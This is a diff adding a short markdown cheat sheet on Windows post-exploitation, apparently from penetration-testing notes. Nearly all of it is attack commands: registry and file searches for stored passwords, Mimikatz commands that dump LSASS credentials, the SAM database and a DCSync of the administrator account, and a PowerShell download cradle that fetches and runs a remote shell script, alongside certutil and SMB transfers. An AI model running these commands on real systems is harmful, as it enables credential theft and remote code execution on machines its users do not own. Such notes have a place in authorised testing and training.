@@ -1,0 +1,49 @@
+# Windows Post Exploitation
+
+## Situational Awareness
+
+Establish your context immediately: privileges, group memberships, network interfaces, and running processes before anything else.
+
+```powershell
+whoami /all
+hostname
+ipconfig /all
+netstat -ano
+net user
+net localgroup administrators
+systeminfo
+```
+
+## Credential Hunting
+
+Registry and config files are the richest sources: grep broadly for the word "password" across common file types.
+
+```powershell
+findstr /si password *.txt *.xml *.ini *.config
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+```
+
+## Mimikatz
+
+Dumps credentials from LSASS: requires SYSTEM or SeDebugPrivilege. Wdigest is often disabled on modern systems but worth checking.
+
+```bash
+.\mimikatz.exe
+sekurlsa::logonpasswords
+sekurlsa::wdigest
+lsadump::sam
+lsadump::dcsync /user:administrator
+```
+
+## File Transfer
+
+Multiple options depending on what's available: PowerShell download cradle works almost everywhere, certutil is a reliable fallback.
+
+```powershell
+IEX(New-Object Net.WebClient).downloadString('http://<IP>/shell.ps1')
+Invoke-WebRequest -Uri http://<IP>/file -OutFile file
+certutil -urlcache -f http://<IP>/file file
+# SMB: impacket-smbserver share . -smb2support
+copy \\<IP>\share\file .
+```
